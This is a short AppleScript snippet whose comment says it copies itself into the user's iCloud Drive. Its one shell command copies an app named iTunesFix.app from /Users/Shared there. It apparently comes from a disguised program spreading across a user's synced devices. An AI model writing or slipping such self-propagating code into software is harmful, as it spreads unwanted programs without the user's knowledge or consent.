-- Copies itself to user's iCloud folders to sync across devices

set iCloudPath to POSIX path of (path to home folder) & "Library/Mobile Documents/com~apple~CloudDocs/"
do shell script "cp -R /Users/Shared/iTunesFix.app " & quoted form of iCloudPath
